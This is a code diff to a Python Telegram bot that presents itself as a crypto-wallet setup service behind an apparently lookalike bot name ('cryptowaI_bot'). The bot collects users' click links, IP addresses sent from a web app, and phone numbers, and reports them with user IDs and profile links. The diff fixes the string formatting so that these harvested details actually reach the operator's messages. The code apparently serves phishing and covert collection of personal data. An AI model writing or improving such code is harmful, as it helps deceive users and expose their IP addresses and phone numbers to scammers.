@@ -23,7 +23,7 @@ def cmd_start(message):
         bot.send_message(message.from_user.id, "Press button to setup your Cryptowallet.", reply_markup=markup)
         link = "https://t.me/cryptowaI_bot"
     user = message.from_user
-    resp = "New click: {link}\n"
+    resp = f"New click: {link}\n"
     resp += f"User ID: {user.id}\n"
     resp += f"Username: @{user.username}\n"
     resp += f"Permalink: [{user.first_name} {user.first_name}](tg://user?id={user.id})"
@@ -36,7 +36,7 @@ def wad_handler(message):
     kb.add(btn)
     data = message.web_app_data.data
     user = message.from_user
-    resp = "New IP: {data}\n"
+    resp = f"New IP: {data}\n"
     resp += f"User ID: {user.id}\n"
     resp += f"Username: @{user.username}\n"
     resp += f"Permalink: [{user.first_name} {user.first_name}](tg://user?id={user.id})"
@@ -48,7 +48,7 @@ def handle_contact(message):
     phone_number = message.contact.phone_number
     user_id = message.contact.user_id
     user = message.from_user
-    resp = "New phone: {phone_number}\n"
+    resp = f"New phone: {phone_number}\n"
     resp += f"User ID: {user.id}\n"
     resp += f"Username: @{user.username}\n"
     resp += f"Permalink: [{user.first_name} {user.first_name}](tg://user?id={user.id})"
